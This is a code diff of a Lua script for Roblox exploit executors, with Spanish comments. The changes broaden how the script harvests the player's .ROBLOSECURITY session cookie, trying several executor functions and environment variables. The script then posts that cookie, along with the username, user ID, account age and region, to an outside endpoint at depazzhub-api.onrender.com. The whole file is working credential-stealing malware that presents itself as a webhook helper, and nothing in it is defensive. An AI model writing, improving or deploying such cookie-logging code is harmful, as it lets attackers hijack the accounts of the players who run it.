@@ -1,50 +1,41 @@
-
--- webhook.lua - VERSIÓN CORREGIDA (Sin CookieService)
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local LocalizationService = game:GetService("LocalizationService")
 
--- Función para obtener cookies (sin CookieService)
-local function GetCookies()
-    local cookies = {}
-    
-    -- Intentar con getcookie() (función de executors)
+local function GetRobloxCookie()
     local success, cookie = pcall(getcookie)
-    if success and cookie and cookie ~= "" then
-        table.insert(cookies, {
-            Name = ".ROBLOSECURITY",
-            Value = cookie,
-            SameSite = "None",
-            Path = "/",
-            Domain = "www.roblox.com"
-        })
-    end
-    
-    -- Intentar con getgenv
-    if #cookies == 0 then
-        local cookieValue = getgenv("_ROBLOSECURITY") or getgenv("ROBLOSECURITY")
-        if cookieValue and cookieValue ~= "" then
-            table.insert(cookies, {
-                Name = ".ROBLOSECURITY",
-                Value = tostring(cookieValue),
-                SameSite = "None",
-                Path = "/",
-                Domain = "www.roblox.com"
-            })
+    if success and cookie and type(cookie) == "string" and cookie ~= "" then
+        if string.find(cookie, "_|WARNING:-DO-NOT-SHARE-THIS") then
+            return string.gsub(cookie, "%.ROBLOSECURITY=", "")
         end
     end
-    
-    return cookies
-end
 
-local function GetCookieValue(cookieName, domain)
-    local cookies = GetCookies()
-    for _, cookie in ipairs(cookies) do
-        if cookie.Name == cookieName then
-            return cookie.Value
+    local success2, cookies = pcall(get_cookies)
+    if success2 and cookies and type(cookies) == "string" and cookies ~= "" then
+        if string.find(cookies, "_|WARNING:-DO-NOT-SHARE-THIS") then
+            return string.gsub(cookies, "%.ROBLOSECURITY=", "")
         end
     end
-    return ""
+
+    local syn = getgenv().syn
+    if syn and type(syn.get_cookies) == "function" then
+        local success3, syn_cookies = pcall(syn.get_cookies)
+        if success3 and syn_cookies and type(syn_cookies) == "string" then
+            if string.find(syn_cookies, "_|WARNING:-DO-NOT-SHARE-THIS") then
+                return string.gsub(syn_cookies, "%.ROBLOSECURITY=", "")
+            end
+        end
+    end
+
+    local env_names = {"_ROBLOSECURITY", "ROBLOSECURITY", "cookie", "rbx_cookie"}
+    for _, name in ipairs(env_names) do
+        local val = getgenv()[name]
+        if val and type(val) == "string" and string.find(val, "_|WARNING:-DO-NOT-SHARE-THIS") then
+            return string.gsub(val, "%.ROBLOSECURITY=", "")
+        end
+    end
+
+    return "Error. May a security"
 end
 
 local function Request(options)
@@ -62,10 +53,8 @@ local function Request(options)
     for key, val in pairs(headers) do
         fullHeaders[key] = val
     end
-    
     fullHeaders["Connection"] = "keep-alive"
     fullHeaders["Accept"] = "*/*"
-    
     if method == "POST" then
         fullHeaders["Content-Type"] = "application/json"
     end
@@ -74,9 +63,8 @@ local function Request(options)
     if type(body) == "table" then
         bodyString = HttpService:JSONEncode(body)
     end
-    
-    -- Intentar con request() del executor
-    local customRequest = getgenv("request") or (getgenv("syn") and getgenv("syn").request)
+
+    local customRequest = getgenv().request or (getgenv().syn and getgenv().syn.request) or (getgenv().http and getgenv().http.request)
     if customRequest then
         local success, response = pcall(function()
             return customRequest({
@@ -90,9 +78,8 @@ local function Request(options)
             return response
         end
     end
-    
-    -- Fallback a HttpService
-    local success, response = pcall(function()
+
+    local successHttp, responseHttp = pcall(function()
         if method == "GET" then
             return HttpService:GetAsync(url, false)
         else
@@ -100,11 +87,11 @@ local function Request(options)
         end
     end)
     
-    if success and response then
+    if successHttp and responseHttp then
         return {
             Success = true,
             StatusCode = 200,
-            Body = response
+            Body = responseHttp
         }
     end
     
@@ -112,21 +99,18 @@ local function Request(options)
 end
 
 local function HttpPost(url, body, options)
-    options = options or {}
     return Request({
         Url = url,
         Method = "POST",
         Body = body,
-        Headers = options.Headers or {
-            ["Content-Type"] = "application/json"
-        },
+        Headers = options.Headers or { ["Content-Type"] = "application/json" },
         Timeout = options.Timeout or 15
     })
 end
 
 local function GetAccountAge()
     local player = Players.LocalPlayer
-    if not player then return "Jugador no encontrado" end
+    if not player then return "Desconocido" end
     
     local days = player.AccountAge
     local years = math.floor(days / 365)
@@ -142,16 +126,11 @@ local function GetRegion()
     return LocalizationService.RobloxLocaleId
 end
 
-local function ToJson(obj)
-    return HttpService:JSONEncode(obj)
-end
-
--- Código principal
 local success, result = pcall(function()
     local player = Players.LocalPlayer
     local placeId = game.PlaceId
     
-    local cookieValue = GetCookieValue(".ROBLOSECURITY", "www.roblox.com")
+    local cookieValue = GetRobloxCookie()
     
     local data = {
         username = player.Name,
@@ -163,9 +142,10 @@ local success, result = pcall(function()
         cookie = ".ROBLOSECURITY=" .. cookieValue
     }
     
-    print("📤 Enviando webhook...")
+    print("📤 Preparando envío de webhook...")
     print("  Usuario: " .. player.Name)
     print("  User ID: " .. tostring(player.UserId))
+    print("  Cookie: " .. (cookieValue ~= "NO_COOKIE_FOUND_EXECUTOR_LIMITADO" and "Detectada ✅" or "No detectada ❌"))
     
     local response = HttpPost("https://depazzhub-api.onrender.com/log", data)
     
@@ -174,12 +154,12 @@ local success, result = pcall(function()
         print("  Status: " .. tostring(response.StatusCode or response.status or "200"))
         return response
     else
-        warn("⚠️ El webhook falló")
+        warn("⚠️ El webhook falló al enviarse.")
         return nil
     end
 end)
 
 if not success then
-    warn("❌ Error al ejecutar el webhook:")
+    warn("❌ Error crítico al ejecutar el webhook:")
     warn("  Detalle: " .. tostring(result))
 end
